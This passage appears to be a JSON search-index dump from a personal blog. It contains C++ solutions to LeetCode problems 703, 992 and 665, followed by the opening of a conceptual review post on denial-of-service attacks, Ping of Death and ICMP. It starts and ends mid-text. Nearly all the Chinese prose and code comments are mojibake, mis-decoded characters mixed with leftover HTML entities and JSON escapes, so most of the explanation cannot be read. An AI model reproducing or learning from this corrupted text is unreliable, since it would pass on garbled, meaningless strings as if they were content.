\u0026lt;\u0026lt; endl; } int add(int val) { int res; if (larger_not_full) { larger.push(val); res = larger.top(); larger_not_full = false; } else { if (val \u0026gt;= larger.top()) // æ¯”ç¬¬Kå¤§æ•°è¿˜å¤§ï¼Œç¬¬Kå¤§æ•°å¯èƒ½æ”¹å˜ { smaller.push(larger.top()); larger.pop(); larger.push(val); // cout \u0026lt;\u0026lt; larger.top() \u0026lt;\u0026lt; endl; res = larger.top(); } else // æ’å…¥äº†ä¸€ä¸ªæ›´å°çš„æ•°ï¼Œä¸ä¼šæ”¹å˜ç¬¬Kå¤§æ•° { smaller.push(val); // cout \u0026lt;\u0026lt; larger.top() \u0026lt;\u0026lt; endl; res = larger.top(); } } return res; } }; /** * Your KthLargest object will be instantiated and called as such: * KthLargest* obj = new KthLargest(k, nums); * int param_1 = obj-\u0026gt;add(val); */ ACä»£ç 2 class KthLargest { public: priority_queue\u0026lt;int, vector\u0026lt;int\u0026gt;, greater\u0026lt;int\u0026gt;\u0026gt; larger; int K; KthLargest(int k, vector\u0026lt;int\u0026gt;\u0026amp; nums) { K = k; for (auto t : nums) { larger.push(t); } while (larger.size() \u0026gt; k) { larger.pop(); } // largeré‡Œçš„æ‰€æœ‰å…ƒç´ éƒ½å¤§äºå †é¡¶ // æ•…ä¿æŒlargerä¸ªæ•°ä¸ºKä¸ªï¼Œå³å¯ä»å †é¡¶ä¸­è·å–ç¬¬Kå¤§æ•° // cout \u0026lt;\u0026lt; \u0026#34;Original \u0026#34; \u0026lt;\u0026lt; k \u0026lt;\u0026lt; \u0026#34;th. largest is \u0026#34; \u0026lt;\u0026lt; larger.top() \u0026lt;\u0026lt; endl; } int add(int val) { int res; if (larger.size() \u0026lt; K) { larger.push(val); res = larger.top(); } else { if (val \u0026gt;= larger.top()) // æ¯”ç¬¬Kå¤§æ•°è¿˜å¤§ï¼Œç¬¬Kå¤§æ•°å¯èƒ½æ”¹å˜ { larger.push(val); larger.pop(); res = larger.top(); } else // æ’å…¥äº†ä¸€ä¸ªæ›´å°çš„æ•°ï¼Œä¸ä¼šæ”¹å˜ç¬¬Kå¤§æ•° { res = larger.top(); } } return res; } }; /** * Your KthLargest object will be instantiated and called as such: * KthLargest* obj = new KthLargest(k, nums); * int param_1 = obj-\u0026gt;add(val); */ ä¼˜åŒ–æ‰smallerå †ä¹‹åï¼Œè¡¨ç°ä¼šå¥½ä¸€äº›ã€‚\nPerformance-Final å‚è€ƒèµ„æ–™ [1] åŠ›æ‰£å®˜æ–¹é¢˜è§£.æ•°æ®æµä¸­çš„ç¬¬Kå¤§å…ƒç´ [EB/OL].2021-02-11\nhttps://leetcode-cn.com/problems/kth-largest-element-in-a-stream/solution/shu-ju-liu-zhong-de-di-k-da-yuan-su-by-l-woz8/\n","date":"2021-02-11T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%94%99%E9%A2%98%E6%9C%AC-leetcode703.-%E6%95%B0%E6%8D%AE%E6%B5%81%E4%B8%AD%E7%9A%84%E7%AC%AC-k-%E5%A4%A7%E5%85%83%E7%B4%A0/","title":"é”™é¢˜æœ¬ | LeetCode703. æ•°æ®æµä¸­çš„ç¬¬ K å¤§å…ƒç´ "},{"content":"é¢˜ç›®é“¾æ¥ï¼šhttps://leetcode-cn.com/problems/subarrays-with-k-different-integers/\næ€è·¯æ˜¯çœŸéš¾æƒ³ï¼Œæƒ³å‡ºæ¥ä¹‹åæ˜¯çœŸç®€å•ã€‚\nå·²ç»æ˜¯æˆ‘ç›®å‰çš„æ°´å¹³æ— æ³•æå®šçš„ç¨‹åº¦äº†ï¼Œåœ¨æ­¤ç¨ä½œè®°å½•ã€‚\né¢˜ç›® ç»™å®šä¸€ä¸ªæ­£æ•´æ•°æ•°ç»„ Aï¼Œå¦‚æœ A çš„æŸä¸ªå­æ•°ç»„ä¸­ä¸åŒæ•´æ•°çš„ä¸ªæ•°æ°å¥½ä¸º Kï¼Œåˆ™ç§° A çš„è¿™ä¸ªè¿ç»­ã€ä¸ä¸€å®šç‹¬ç«‹çš„å­æ•°ç»„ä¸ºå¥½å­æ•°ç»„ã€‚\nï¼ˆä¾‹å¦‚ï¼Œ[1,2,3,1,2] ä¸­æœ‰ 3 ä¸ªä¸åŒçš„æ•´æ•°ï¼š1ï¼Œ2ï¼Œä»¥åŠ 3ã€‚ï¼‰\nè¿”å› A ä¸­å¥½å­æ•°ç»„çš„æ•°ç›®ã€‚\nç¤ºä¾‹1\nè¾“å…¥ï¼š A = [1,2,1,2,3], K = 2\nè¾“å‡ºï¼š 7\nè§£é‡Šï¼š æ°å¥½ç”± 2 ä¸ªä¸åŒæ•´æ•°ç»„æˆçš„å­æ•°ç»„ï¼š[1,2], [2,1], [1,2], [2,3], [1,2,1], [2,1,2], [1,2,1,2].\nç¤ºä¾‹2\nè¾“å…¥ï¼š A = [1,2,1,3,4], K = 3\nè¾“å‡ºï¼š 3\nè§£é‡Šï¼š æ°å¥½ç”± 3 ä¸ªä¸åŒæ•´æ•°ç»„æˆçš„å­æ•°ç»„ï¼š[1,2,1,3], [2,1,3], [1,3,4].\næ•°æ®èŒƒå›´\n1 \u0026lt;= A.length \u0026lt;= 20000 1 \u0026lt;= A[i] \u0026lt;= A.length 1 \u0026lt;= K \u0026lt;= A.length åˆ†æ è¿™ä¸ªæœˆæ˜¯æ»‘åŠ¨çª—å£æœˆå•Šï¼Œè¿™é¢˜ä¹Ÿæƒ³ç€æ»‘åŠ¨çª—å£ï¼Œä½†æ˜¯æ²¡æœ‰ä»¥å‰çš„é¢˜ç›®é‚£ä¹ˆç›´ç™½äº†ã€‚\næˆ‘ä»¬å¯ä»¥çœ‹çœ‹æ»‘åŠ¨çª—å£å¸¸ç”¨çš„åœºæ™¯â€”â€”â€œæœ€å€¼â€é—®é¢˜ï¼š\n76. æœ€å°è¦†ç›–å­ä¸²ï¼› 209. é•¿åº¦æœ€å°çš„å­æ•°ç»„ï¼› 159. è‡³å¤šåŒ…å«ä¸¤ä¸ªä¸åŒå­—ç¬¦çš„æœ€é•¿å­ä¸²ï¼› 424. æ›¿æ¢åçš„æœ€é•¿é‡å¤å­—ç¬¦ã€‚ åœ¨è¿™é“é¢˜ä¸­ï¼Œæˆ‘ä»¬è¦æŠŠâ€œæ°å¥½â€è½¬æ¢æˆä¸ºâ€œæœ€å¤šâ€ã€‚ä½¿ç”¨æœ€å¤šåŒ…å«Kä¸ªä¸åŒæ•´æ•°çš„å­åŒºé—´ä¸ªæ•°å‡æ‰æœ€å¤šåŒ…å«K - 1ä¸ªä¸åŒæ•´æ•°çš„å­åŒºé—´ä¸ªæ•°ï¼Œæ­£æ˜¯æ‰€è¦æ±‚çš„æ°å¥½åŒ…å«Kä¸ªä¸åŒæ•´æ•°çš„å­åŒºé—´ä¸ªæ•°ã€‚\nä¸ºä»€ä¹ˆèƒ½æƒ³åˆ°è¿™æ ·çš„æ€è·¯å‘¢ï¼Ÿæ— ä»–ï¼Œå”¯æ‰‹ç†Ÿå°”ã€‚\nå¦‚ä½•ä½¿ç”¨æ»‘åŠ¨çª—å£æ±‚è§£æœ€å¤šåŒ…å«Kä¸ªä¸åŒæ•´æ•°çš„å­åŒºé—´ä¸ªæ•°å‘¢ï¼Ÿæˆ‘ä»¬ä½¿ç”¨ä¸¤ä¸ªæŒ‡é’ˆleftå’Œrightæ¥æ ‡è¯†ä¸€ä¸ªå·¦é—­å³é—­åŒºé—´ï¼Œæ¯å½“ä¸€ä¸ªçª—å£æ»¡è¶³å…¶å†…çš„å…ƒç´ å°äºç­‰äºKä¸ªæ—¶ï¼Œè¿™ä¸ªçª—å£å°†ä¼šè´¡çŒ®right - left + 1ä¸ªå­æ•°ç»„ã€‚å½“ä¸€ä¸ªçª—å£å†…çš„å…ƒç´ å¤§äºKä¸ªæ—¶ï¼Œæˆ‘ä»¬ç§»åŠ¨å·¦æŒ‡é’ˆï¼Œä½¿å¾—çª—å£å†…çš„å…ƒç´ å†æ¬¡å°äºç­‰äºKä¸ªï¼Œç„¶åå†è€ƒè™‘å®ƒçš„è´¡çŒ®ã€‚\nä¸ºä»€ä¹ˆä¸€ä¸ªçª—å£èƒ½è´¡çŒ®è¿™ä¹ˆå¤šçš„å­æ•°ç»„å‘¢ï¼Ÿä»¥åŠè¿™ç§æ–¹æ³•çš„æ­£ç¡®æ€§åœ¨å“ªé‡Œå‘¢ï¼Ÿ\nä»¥ç¤ºä¾‹1ä¸ºä¾‹ï¼Œæ•°ç»„[1,2,1,2,3], K = 2ï¼Œæˆ‘ä»¬è€ƒè™‘å…ƒç´ ä¸ªæ•°å°äºç­‰äº2çš„æ‰€æœ‰å­æ•°ç»„ã€‚\nå½“left = right = 0æ—¶ï¼Œçª—å£å†…ä¸åŒå…ƒç´ ä¸ªæ•°å°äºç­‰äº2ï¼Œè´¡çŒ®äº†ä¸€ä¸ªå­æ•°ç»„ã€‚\nå½“left = 0, right = 1æ—¶ï¼Œçª—å£å†…ä¸åŒå…ƒç´ ä¸ªæ•°ç­‰äº2ï¼Œè´¡çŒ®äº†ä¸¤ä¸ªå­æ•°ç»„ã€‚\n\u0026hellip;\u0026hellip;\næˆ‘ä»¬ç‰¹åˆ«åœ°è€ƒè™‘left = 0, right = 3çš„æƒ…å†µï¼Œçª—å£å†…ä¸åŒå…ƒç´ çš„ä¸ªæ•°è¿˜æ˜¯2ï¼Œæˆ‘ä»¬çœ‹çœ‹å®ƒåˆ°åº•æ˜¯ä¸æ˜¯è´¡çŒ®äº†3 - 2 + 1 = 4ä¸ªå­æ•°ç»„ã€‚\n4ä¸ªæ»¡è¶³æ¡ä»¶çš„å­æ•°ç»„ æ˜¯çš„ï¼Œæˆ‘ä»¬ä»rightå‘å·¦å»¶ä¼¸ï¼ŒåŒ…æ‹¬rightæ‰€æŒ‡çš„å…ƒç´ æœ¬èº«åœ¨å†…ï¼Œä¸€å…±èƒ½æ‰¾åˆ°right - left + 1 = 4ä¸ªå­æ•°ç»„ã€‚\næ³¨æ„æ˜¯ä»rightå‘å·¦å»¶ä¼¸ï¼Œå› ä¸ºå³è¾¹ç•Œå°äºrightçš„å­æ•°ç»„ä¸€å®šåœ¨æ›´æ—©çš„å¾ªç¯è¢«è€ƒè™‘è¿‡äº†ã€‚æ¯”å¦‚å›¾ä¸­çš„ä¸­é—´å­æ•°ç»„[2, 1]ï¼Œåœ¨æˆ‘ä»¬çš„right = 2æ—¶å·²ç»è€ƒè™‘è¿‡å®ƒã€‚\nå› æ­¤ï¼Œèƒ½å¤Ÿå†™å‡ºè‡³å¤šåŒ…å«Kä¸ªå­å…ƒç´ çš„æ»‘åŠ¨çª—å£ä»£ç ï¼š\nint subarrayWithMostKDistinct(vector\u0026lt;int\u0026gt;\u0026amp; A, int K) { int len = A.size(); if (len == 1) return 1; int freq[200001] = { 0 }; int left = 0; int right = 0; int cnt = 0; int res = 0; while (right \u0026lt; len) { freq[A[right]]++; // åŠ å…¥ if (freq[A[right]] == 1) // æ–°çš„å…ƒç´  { cnt++; } while (cnt \u0026gt; K) // å·²ç»ä¸æ»¡è¶³æ¡ä»¶ { freq[A[left]]--; if (freq[A[left]] == 0) cnt--; left++; } res += (right - left + 1); right++; } return res; } ACä»£ç  class Solution { public: int subarrayWithMostKDistinct(vector\u0026lt;int\u0026gt;\u0026amp; A, int K) { /* æœ€å¤šåŒ…å«Kä¸ªä¸åŒå…ƒç´ çš„å­æ•°ç»„ä¸ªæ•° ` ` */ int len = A.size(); if (len == 1) return 1; int freq[200001] = { 0 }; int left = 0; int right = 0; int cnt = 0; int res = 0; while (right \u0026lt; len) { freq[A[right]]++; // åŠ å…¥ if (freq[A[right]] == 1) // æ–°çš„å…ƒç´  { cnt++; } while (cnt \u0026gt; K) // å·²ç»ä¸æ»¡è¶³æ¡ä»¶ { freq[A[left]]--; if (freq[A[left]] == 0) cnt--; left++; } res += (right - left + 1); right++; } return res; } int subarraysWithKDistinct(vector\u0026lt;int\u0026gt;\u0026amp; A, int K) { return subarrayWithMostKDistinct(A, K) - subarrayWithMostKDistinct(A, K - 1); } }; è¡¨ç°æ•ˆæœè«åå…¶å¦™ğŸ˜\nPerformance äººä¸€èƒ½ä¹‹ï¼Œå·±ç™¾ä¹‹ï¼›äººåèƒ½ä¹‹ï¼Œå·±åƒä¹‹ã€‚æœèƒ½æ­¤é“çŸ£ï¼Œè™½æ„šå¿…æ˜ï¼Œè™½æŸ”å¿…å¼ºã€‚\nå‚è€ƒèµ„æ–™ [1] åŠ›æ‰£ï¼ˆLeetCodeï¼‰.Kä¸ªä¸åŒæ•´æ•°çš„å­æ•°ç»„[EB/OL].2021-02-08\nhttps://leetcode-cn.com/problems/subarrays-with-k-different-integers/solution/k-ge-bu-tong-zheng-shu-de-zi-shu-zu-by-l-ud34/\n","date":"2021-02-09T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode992.-k-%E4%B8%AA%E4%B8%8D%E5%90%8C%E6%95%B4%E6%95%B0%E7%9A%84%E5%AD%90%E6%95%B0%E7%BB%84/","title":"éš¾é¢˜æœ¬ | LeetCode992. K ä¸ªä¸åŒæ•´æ•°çš„å­æ•°ç»„"},{"content":"é¢˜ç›®é“¾æ¥ï¼šhttps://leetcode-cn.com/problems/non-decreasing-array/\nçœ‹åˆ°è¿™é¢˜ç¬¬ä¸€æ„Ÿå—ï¼šç®€å•é¢˜ï¼\nåšå®Œè¿™é¢˜ç¬¬ä¸€æ„Ÿå—ï¼šç®€å•é¢˜ï¼Ÿ\né¢˜ç›® ç»™ä½ ä¸€ä¸ªé•¿åº¦ä¸º n çš„æ•´æ•°æ•°ç»„ï¼Œè¯·ä½ åˆ¤æ–­åœ¨ æœ€å¤š æ”¹å˜ 1 ä¸ªå…ƒç´ çš„æƒ…å†µä¸‹ï¼Œè¯¥æ•°ç»„èƒ½å¦å˜æˆä¸€ä¸ªéé€’å‡æ•°åˆ—ã€‚\næˆ‘ä»¬æ˜¯è¿™æ ·å®šä¹‰ä¸€ä¸ªéé€’å‡æ•°åˆ—çš„ï¼š å¯¹äºæ•°ç»„ä¸­æ‰€æœ‰çš„ i (0 \u0026lt;= i \u0026lt;= n-2)ï¼Œæ€»æ»¡è¶³ nums[i] \u0026lt;= nums[i + 1]ã€‚\nç¤ºä¾‹1\nè¾“å…¥ï¼š nums = [4,2,3]\nè¾“å‡ºï¼š true\nè§£é‡Šï¼š ä½ å¯ä»¥é€šè¿‡æŠŠç¬¬ä¸€ä¸ª4å˜æˆ1æ¥ä½¿å¾—å®ƒæˆä¸ºä¸€ä¸ªéé€’å‡æ•°åˆ—ã€‚\nç¤ºä¾‹2\nè¾“å…¥ï¼š nums = [4,2,1]\nè¾“å‡ºï¼š false\næ•°æ®èŒƒå›´\n1 \u0026lt;= n \u0026lt;= 10 ^ 4 - 10 ^ 5 \u0026lt;= nums[i] \u0026lt;= 10 ^ 5 åˆ†æ ç®€å•é¢˜æ¯•ç«Ÿè¿˜æ˜¯ç®€å•é¢˜ï¼Œæ€è·¯åˆæ­¥æ‰¾èµ·æ¥æ˜¯æ¯”è¾ƒå®¹æ˜“çš„ã€‚\næˆ‘ä»¬æŠŠæ‰€æœ‰å…ƒç´ ä»¥(index, value)è¿™ç§å½¢å¼åœ¨åæ ‡è½´ä¸Šç”»å‡ºæ¥ï¼Œæ¨ªåæ ‡æ˜¯å…ƒç´ ä¸‹æ ‡ï¼Œçºµåæ ‡æ˜¯å…ƒç´ æ•°å€¼ï¼Œé‚£ä¹ˆå¦‚æœå¸Œæœ›è¯¥æ•°ç»„æ˜¯ä¸€ä¸ªéé€’å‡æ•°åˆ—ï¼Œè¿™å¼ æŠ˜çº¿å›¾çš„å½¢çŠ¶æœ€ç»ˆéœ€è¦æ»¡è¶³å„ä¸ªéƒ¨ä½çš„æ–œç‡éƒ½å¤§äºç­‰äº0ã€‚\nå¦‚æœåœ¨å…è®¸æ”¹å˜ä¸€ä¸ªå…ƒç´ çš„æƒ…å†µä¸‹ï¼Œå¸Œæœ›è¯¥æ•°ç»„å˜ä¸ºä¸€ä¸ªéé€’å‡æ•°åˆ—ï¼Œé‚£ä¹ˆåˆå§‹å›¾å½¢åªå…è®¸æœ‰ä¸€ä¸ªæ³¢è°·å­˜åœ¨ï¼Œè€Œä¸”è¿™ä¸ªæ³¢è°·è¿˜å¿…é¡»å…·å¤‡æŸäº›æ€§è´¨ã€‚\nä¾‹å¦‚ï¼Œå¯¹äºä¸€ç»„æ•°æ®3,5,6,7,8,3,10ï¼Œå¯ä»¥æ”¹å˜å€’æ•°ç¬¬äºŒä¸ªå…ƒç´ 3ï¼Œä»¤å…¶ç­‰äº8ï¼Œå³å¯æ„æˆä¸€ä¸ªéé€’å‡æ•°åˆ—ã€‚\nè¿™ç»„æ•°æ®åŸæœ¬çš„æŠ˜çº¿å›¾æ˜¯è¿™æ ·çš„ï¼š\nFig 1. æ”¹å˜ä¸€ä¸ªå…ƒç´ åçš„æŠ˜çº¿å›¾æ˜¯è¿™æ ·çš„ï¼š\nFig 2. ä¸‹é¢ç»™å‡ºåŸå§‹æŠ˜çº¿å›¾éœ€è¦æ»¡è¶³çš„ä¸¤ä¸ªæ€§è´¨ï¼š\nå¯¹äºåŸå§‹çš„æŠ˜çº¿å›¾ï¼Œé¦–å…ˆåªå…è®¸æœ‰ä¸€ä¸ªæ³¢è°·å­˜åœ¨ï¼Œå¦‚æœè¶…è¿‡ä¸€ä¸ªæ³¢è°·ï¼Œè¯´æ˜å­˜åœ¨æœ‰ä¸¤å¤„çš„éé€’å‡æƒ…å†µï¼Œè¿™æ—¶åªæ”¹å˜ä¸€ä¸ªå…ƒç´ æ˜¯ä¸è¡Œçš„ã€‚\nå¯¹äºè¿™ä¸€å¤„æ³¢è°·ï¼Œè¿˜æœ‰å‡ ç§æƒ…å†µï¼š\næ³¢è°·å·¦è¾¹çš„å…ƒç´ å°äºç­‰äºæ³¢è°·å³è¾¹ã€‚ä¹Ÿå°±æ˜¯Fig1çš„æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä»¤æ³¢è°·å…ƒç´ ç­‰äºæ³¢è°·å·¦è¾¹çš„å…ƒç´ ï¼Œè¿™æ ·å°±å¡«å¹³äº†æ³¢è°·ï¼Œå¹¶ä¸”ä¿æŒç»§ç»­ä¸Šæ¶¨çš„è¶‹åŠ¿ä¸å˜ï¼›å¦‚æœæ³¢è°·å³è¾¹å·²ç»æ²¡æœ‰å…ƒç´ ï¼Œè¯´æ˜å·²ç»åˆ°è¾¾äº†æœ€åï¼Œç›´æ¥å°†æ³¢è°·å…ƒç´ æ‹”é«˜å³å¯ï¼›\næ³¢è°·å·¦è¾¹çš„å…ƒç´ å¤§äºæ³¢è°·å³è¾¹ã€‚æ­¤æ—¶æˆ‘ä»¬å°±ä¸èƒ½å°†æ³¢è°·æ‹”é«˜åˆ°å…¶å·¦è¾¹çš„å…ƒç´ äº†ï¼Œåªèƒ½å°†å…¶å·¦è¾¹çš„å…ƒç´ æ‹‰ä½åˆ°æ³¢è°·ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬è¦è€ƒè™‘åˆ°æ³¢è°·å·¦è¾¹ç¬¬äºŒä¸ªå…ƒç´ ï¼Œå¦‚æœå®ƒä¹Ÿå¤§äºæ³¢è°·ï¼Œè¿™æ—¶å°±ä¸å­˜åœ¨ä¸€ç§åŠæ³•æ¥å¡«å¹³æ³¢è°·ã€‚\næˆ‘ä»¬å…ˆçœ‹çœ‹å¯ä»¥å¡«å¹³æ³¢è°·çš„æƒ…å†µï¼š\nFig 3. å¯ä»¥çœ‹åˆ°ï¼Œæ³¢è°·å·¦è¾¹ç¬¬äºŒä¸ªå…ƒç´ å°äºæ³¢è°·ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°†æ³¢è°·å·¦è¾¹çš„å…ƒç´ æ‹‰ä½åˆ°æ³¢è°·çš„æ°´å¹³ï¼Œå°±èƒ½æŠŠæ³¢è°·æ¶ˆé™¤æ‰ï¼š\nFig 4. å½“æ³¢è°·å·¦è¾¹ç¬¬äºŒä¸ªå…ƒç´ å¤§äºæ³¢è°·ï¼Œæˆ‘ä»¬æŠŠæ³¢è°·å·¦è¾¹çš„å…ƒç´ æ‹‰ä½åˆ°æ³¢è°·æ—¶ï¼Œäº§ç”Ÿäº†æ–°çš„æ³¢è°·ï¼š\næ³¢è°·å·¦è¾¹ç¬¬äºŒä¸ªå…ƒç´ å¤§äºæ³¢è°· äº§ç”Ÿæ–°çš„æ³¢è°· ç‰¹åˆ«åœ°ï¼Œå½“æ³¢è°·å·¦è¾¹åªæœ‰ä¸€ä¸ªå…ƒç´ ï¼Œè‡ªç„¶å°±ç›´æ¥å°†å·¦è¾¹çš„å…ƒç´ æ‹‰ä½å³å¯ã€‚ç¤ºä¾‹1ä¸­çš„nums = [4,2,3]å°±å±äºè¿™ç§æƒ…å†µã€‚\nACä»£ç  ä¸‹æ ‡ä»å‰å¾€åé€’å¢ï¼Œæ¯æ¬¡åˆ¤æ–­æ˜¯å¦å‡ºç°ä¸€ä¸ªä¸‹é™çš„åŒºæ®µã€‚\né¦–å…ˆï¼Œå…¨å±€èŒƒå›´å†…åªèƒ½å‡ºç°ä¸€æ¬¡ä¸‹é™ï¼›\nå…¶æ¬¡ï¼Œè¿™ä¸ªæ³¢è°·è¦åˆ†ä¸Šé¢ä¸¤ç§æƒ…å†µè®¨è®ºã€‚\nclass Solution { public: bool checkPossibility(vector\u0026lt;int\u0026gt;\u0026amp; nums) { int len = nums.size(); if (len == 1) { return true; } int ptr; int change = 0; // æ”¹å˜çš„å…ƒç´ ä¸ªæ•° bool res = true; ptr = 1; while (ptr \u0026lt; len) { if (nums[ptr] \u0026lt; nums[ptr - 1]) // é€’å‡äº† { if (change \u0026lt; 1) { // æ³¢è°·å·¦è¾¹çš„å…ƒç´ å¤§äºæ³¢è°·å³è¾¹ï¼Œåªèƒ½æ‹‰ä½å·¦è¾¹å…ƒç´ ï¼Œä¸èƒ½æ‹”é«˜æ³¢è°· if (ptr + 1 \u0026lt; len \u0026amp;\u0026amp; nums[ptr - 1] \u0026gt; nums[ptr + 1]) { // åªèƒ½æ”¹å˜nums[ptr - 1] if ((ptr - 2 \u0026gt;= 0 \u0026amp;\u0026amp; nums[ptr - 2] \u0026lt;= nums[ptr]) || ptr == 1) { nums[ptr - 1] = nums[ptr]; change++; continue; } else { // nums[ptr - 2] \u0026gt; nums[ptr] res = false; break; } } else // æ³¢è°·å·¦è¾¹å…ƒç´ å°äºç­‰äºæ³¢è°·å³è¾¹å…ƒç´ ï¼Œç›´æ¥æ‹”é«˜æ³¢è°· { nums[ptr] = nums[ptr - 1]; change++; continue; } } else { res = false; break; } } ptr++; } return res; } }; è¡¨ç°å¾ˆä¸€èˆ¬ï¼Œå°±ä¸æ”¾å‡ºæ¥äº†ã€‚æ¯”è¾ƒå¤æ‚çš„é€»è¾‘å¢å¤§äº†æ—¶é—´æ¶ˆè€—ï¼Œæš‚æ—¶æ²¡æœ‰çœ‹åˆ°æœ‰ä»€ä¹ˆä¼˜åŒ–çš„åŠæ³•ã€‚\n","date":"2021-02-07T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode665.-%E9%9D%9E%E9%80%92%E5%87%8F%E6%95%B0%E5%88%97/","title":"éš¾é¢˜æœ¬ | LeetCode665. éé€’å‡æ•°åˆ—"},{"content":"ç½‘ç»œå®‰å…¨ç†è®ºå¤ä¹ å¼€å§‹äº†ï¼\nä»Šå¤©ä»æœ€ç®€å•çš„å¼€å§‹ï¼Œç›®æ ‡æ˜¯åœ¨å¯’å‡æœŸé—´æ•´ç†å®Œæˆã€Šç½‘ç»œå®‰å…¨ã€‹è¿™é—¨è¯¾æ‰€æ¶‰åŠçš„çŸ¥è¯†ã€‚å¸Œæœ›æœ¬ç³»åˆ—æ–‡ç« èƒ½ä»¥æ¸…æ™°çš„æ€è·¯å°†å®‰å…¨ç†è®ºè¡¨è¿°å‡ºæ¥ã€‚\nDoS Denial of Serviceï¼Œæ‹’ç»æœåŠ¡ï¼Œæ˜¯ç°ä»£ç½‘ç»œå®‰å…¨é¢†åŸŸå¾ˆå¸¸è§çš„ä¸€ç§æ”»å‡»ã€‚æ‰€è°“æ‹’ç»æœåŠ¡ï¼Œå°±æ˜¯é€šè¿‡ä¸€ç³»åˆ—æ‰‹æ®µä½¿å¾—åŸæœ¬æ­£å¸¸è¿è¡Œçš„æœåŠ¡å™¨æ— æ³•å†ä¸ºç”¨æˆ·çš„è¯·æ±‚æä¾›æœåŠ¡ä¸åº”ç­”ï¼Œä»è€Œä½¿ç›®æ ‡ä¸šåŠ¡åœæ»ã€‚\næˆ‘ä»¬ç»å¸¸èƒ½çœ‹åˆ°æ‹’ç»æœåŠ¡çš„ä¾‹å­ï¼šä½¿ç”¨â€å‘¼æ­»ä½ â€œè½¯ä»¶ä¸æ–­åœ°æ‹¨æ‰“æŸäººçš„ç”µè¯ï¼Œåˆ™å…¶ä»–äººæ­£å¸¸å‘¼å«çš„æ—¶å€™ä»–æ°¸è¿œæ˜¯å çº¿çš„çŠ¶æ€ï¼›ç½‘ç»œâ€æ°´å†›â€œæ§è¯„ï¼Œæ­£å¸¸çš„è¯„è®ºå’Œç•™è¨€å°±æ— æ³•è¢«çœ‹åˆ°ï¼›é»„ç‰›ä½¿ç”¨æ¶æ„çš„æŠ¢ç¥¨è½¯ä»¶æŠ¢å æ‰€æœ‰ç”µå½±ç¥¨ï¼Œä½¿å¾—æ­£å¸¸æ¸ é“æ— æ³•è·å¾—``````\nåœ¨è®¡ç®—æœºç½‘ç»œçš„ä¸–ç•Œä¸­ï¼Œæ‹’ç»æœåŠ¡æ”»å‡»å¯ä»¥æ˜¯éå¸¸ç²—æš´çš„ç‰©ç†æ”»å‡»ï¼šç ¸æ¯æœåŠ¡å™¨ã€åˆ‡æ–­ç½‘çº¿ç­‰ï¼›æ›´ä¸ºå¸¸è§ä¸”ç¨å¾®æœ‰ç‚¹æŠ€æœ¯å«é‡çš„æ˜¯åˆ©ç”¨è®¡ç®—æœºæœ¬èº«çš„æ¼æ´ï¼Œæ„é€ æ¶æ„çš„ç½‘ç»œè¯·æ±‚æ¥ä½¿ç›®æ ‡ç³»ç»Ÿå´©æºƒã€ä¸»æœºå®•æœºã€é‡å¯ç­‰ã€‚\nä¸‹é¢ä»‹ç»ä¸€äº›å¸¸è§çš„DoSæ”»å‡»æ‰‹æ³•ã€‚\nPing of Death Ping of Deathï¼ˆæ­»äº¡ä¹‹Pingï¼‰çš„åŸç†æ˜¯æ„é€ ä¸€ä¸ªè¶…å¤§çš„IPåŒ…æ¥ä½¿ç›®æ ‡ä¸»æœºç˜«ç—ªã€‚åœ¨è¯¦ç»†è§£é‡Šè¿™ä¸ªæ‰‹æ³•ä¹‹å‰ï¼Œéœ€è¦ä»ICMPåè®®å…¥æ‰‹ï¼Œä»‹ç»Pingçš„åŸºæœ¬çŸ¥è¯†ã€‚\nICMP ç½‘é™…æ§åˆ¶æŠ¥æ–‡åè®®ï¼ˆICMPï¼‰ç”¨äºè®©ä¸»æœºæˆ–è·¯ç”±å™¨æŠ¥å‘Šå·®é”™å’Œå¼‚å¸¸æƒ…å†µã€‚ICMPæŠ¥æ–‡åŒ…å«åœ¨IPæ•°æ®æŠ¥ä¸­ï¼Œä½œä¸ºIPæ•°æ®æŠ¥çš„æ•°æ®éƒ¨åˆ†ï¼ŒåŠ ä¸ŠIPé¦–éƒ¨å‘é€å‡ºå»ï¼Œå› æ­¤ï¼ŒICMPæ˜¯ä¸€ä¸ªç½‘ç»œå±‚åè®®ã€‚\nICMPæŠ¥æ–‡çš„ç§ç±»æœ‰ä¸¤ç§ï¼ŒICMPå·®é”™æŠ¥å‘ŠæŠ¥æ–‡å’ŒICMPè¯¢é—®æŠ¥æ–‡ã€‚\nICMPå·®é”™æŠ¥å‘ŠæŠ¥æ–‡ç”¨äºç›®æ ‡ä¸»æœºæˆ–åˆ°ç›®æ ‡ä¸»æœºè·¯å¾„ä¸Šçš„è·¯ç”±å™¨å‘æºä¸»æœºæŠ¥å‘Šå·®é”™å’Œå¼‚å¸¸æƒ…å†µï¼Œå…±æœ‰5ç§ç±»å‹ï¼š\nç»ˆç‚¹ä¸å¯è¾¾ã€‚ æºç‚¹æŠ‘åˆ¶ã€‚ç”±äºæ‹¥å¡è€Œä¸¢å¼ƒæ•°æ®æŠ¥æ—¶ï¼Œè¦æ±‚æºä¸»æœºå‡å°å‘é€é€Ÿç‡ã€‚ æ—¶é—´è¶…è¿‡ã€‚ å‚æ•°é—®é¢˜ã€‚è·¯ç”±å™¨æˆ–ç›®çš„ä¸»æœºæ”¶åˆ°çš„æ•°æ®æŠ¥é¦–éƒ¨ä¸­æœ‰çš„å­—æ®µä¸æ­£ç¡®ã€‚ æ”¹å˜è·¯ç”±ï¼ˆé‡å®šå‘ï¼‰ã€‚è·¯ç”±å™¨æŠŠé‡å®šå‘ä¿¡æ¯å‘ç»™ä¸»æœºï¼Œä¸‹ä¸€æ¬¡ä½¿ç”¨æ›´å¥½çš„è·¯ç”±ã€‚ ICMPè¯¢é—®æŠ¥æ–‡æœ‰4ç§ç±»å‹ï¼š\nå›é€è¯·æ±‚å’Œåº”ç­”ã€‚ä¸»æœºå‘ç›®æ ‡å‘é€ICMPè¯·æ±‚ï¼Œå¦‚æœé€”ä¸­æ²¡æœ‰å¼‚å¸¸ï¼Œåˆ™ç›®æ ‡æ”¶åˆ°æ¶ˆæ¯åæ¢å¤ICMPå“åº”ã€ 